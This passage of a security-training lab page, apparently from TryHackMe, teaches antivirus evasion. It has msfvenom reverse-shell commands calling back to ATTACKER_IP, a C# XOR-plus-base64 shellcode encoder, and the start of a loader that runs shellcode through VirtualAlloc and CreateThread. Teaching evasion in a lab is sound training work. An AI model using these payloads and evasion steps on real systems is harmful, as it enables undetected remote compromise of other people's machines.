plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    aes256</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rc4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor</span><br></span></code></pre></div></div>
<p>Let&#x27;s build an XOR encrypted payload. For this type of algorithm, you will need to specify a key. The command would look as follows:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Xoring Shellcode using the Metasploit Framework</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7788</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> exe </span><span class="token parameter variable" style="color:#36acaa">--encrypt</span><span class="token plain"> xor --encrypt-key </span><span class="token string" style="color:#e3116c">&quot;MyZekr3tKey***&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> xored-revshell.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">510</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of exe file: </span><span class="token number" style="color:#36acaa">7168</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Saved as: xored-revshell.exe</span><br></span></code></pre></div></div>
<p>Once again, if we upload the resulting shell to the THM Antivirus Check! page at <code>http://MACHINE_IP/</code>, it will still be flagged by the AV. The reason is still that AV vendors have invested lots of time into ensuring simple msfvenom payloads are detected.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="creating-a-custom-payload">Creating a Custom Payload<a href="#creating-a-custom-payload" class="hash-link" aria-label="Direct link to Creating a Custom Payload" title="Direct link to Creating a Custom Payload" translate="no">​</a></h3>
<p>The best way to overcome this is to use our own custom encoding schemes so that the AV doesn&#x27;t know what to do to analyze our payload. Notice you don&#x27;t have to do anything too complex, as long as it is confusing enough for the AV to analyze. For this task, we will take a simple reverse shell generated by msfvenom and use a combination of XOR and Base64 to bypass Defender.</p>
<p>Let&#x27;s start by generating a reverse shell with msfvenom in CSharp format:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Generate a CSharp shellcode Format</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/shell_reverse_tcp </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> csharp</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-encoder">The Encoder<a href="#the-encoder" class="hash-link" aria-label="Direct link to The Encoder" title="Direct link to The Encoder" translate="no">​</a></h3>
<p>Before building our actual payload, we will create a program that will take the shellcode generated by msfvenom and encode it in any way we like. In this case, we will be XORing the payload with a custom key first and then encoding it using base64. Here&#x27;s the complete code for the encoder (you can also find this code in your Windows machine at <code>C:\Tools\CS Files\Encryptor.cs</code>):</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Full Payload Code (Click to read) </summary><div><div class="collapsibleContent_i85q"><div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Collections</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Generic</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Linq</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Threading</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Tasks</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">namespace</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">Encrypter</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">internal</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">byte</span><span class="token return-type class-name punctuation" style="color:#393A34">[</span><span class="token return-type class-name punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                shell</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^=</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">//XOR Key - It has to be the same in the Droppr for Decrypting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;THMK3y123!&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">//Convert Key into bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> keyBytes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Encoding</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ASCII</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">GetBytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">//Original Shellcode here (csharp format)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> buf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token constructor-invocation class-name keyword" style="color:#00009f">byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">460</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xfc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token range operator" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xda</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xd5</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">//XORing byte by byte and saving into a new array of bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> encoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> keyBytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">WriteLine</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Convert</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ToBase64String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encoded</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div></div></div></details>
<p>The code is pretty straightforward and will generate an encoded payload that we will embed on the final payload. Remember to replace the buf variable with the shellcode you generated with msfvenom.</p>
<p>To compile and execute the encoder, we can use the following commands on the Windows machine:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Compiling and running our custom CSharp encoder</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> csc.exe Encrypter.cs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> .</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Encrypter.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">pEvWzJg3oE</span><span class="token operator" style="color:#393A34">=</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="self-decoding-payload">Self-decoding Payload<a href="#self-decoding-payload" class="hash-link" aria-label="Direct link to Self-decoding Payload" title="Direct link to Self-decoding Payload" translate="no">​</a></h3>
<p>Since we have an encoded payload, we need to adjust our code so that it decodes the shellcode before executing it. To match the encoder, we will decode everything in the reverse order we encoded it, so we start by decoding the base64 content and then continue by XORing the result with the same key we used in the encoder. Here&#x27;s the full payload code (you can also get it in your Windows machine at <code>C:\Tools\CS Files\EncStageless.cs</code>):</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Full Payload Code (Click to read) </summary><div><div class="collapsibleContent_i85q"><div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Net</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Runtime</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">InteropServices</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flAllocationType</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">IntPtr</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadAttributes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwStackSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">IntPtr</span><span class="token plain"> param</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwCreationFlags</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">IntPtr</span><span class="token plain"> hHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwMilliseconds</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> MEM_COMMIT </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1000</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> PAGE_EXECUTE_READWRITE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">byte</span><span class="token return-type class-name punctuation" style="color:#393A34">[</span><span class="token return-type class-name punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                shell</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^=</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> dataBS64 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" 